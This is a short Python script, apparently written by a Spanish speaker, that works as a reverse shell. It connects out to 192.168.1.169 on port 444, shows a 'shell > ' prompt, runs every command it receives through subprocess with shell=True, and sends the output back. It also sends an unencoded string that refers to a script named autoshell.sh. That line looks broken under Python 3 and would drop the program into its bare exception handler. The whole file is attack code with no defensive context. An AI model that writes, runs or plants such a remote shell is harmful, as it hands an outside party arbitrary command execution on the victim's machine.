import socket
import subprocess
import os

cliente = socket.socket()
try:
   cliente.connect(('192.168.1.169',444))
   cliente.send("shell > ".encode("ascii"))
   cliente.send("os.system('bash autoshell.sh')")
   while True:
       comandoBytes=cliente.recv(1024)
       comandoCodificado=comandoBytes.decode("ascii")
       comando=subprocess.Popen(comandoCodificado,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
       cliente.send(comando.stdout.read())
       cliente.send("shell > ".encode("ascii"))
             
except:
    print("Has salido")
    pass
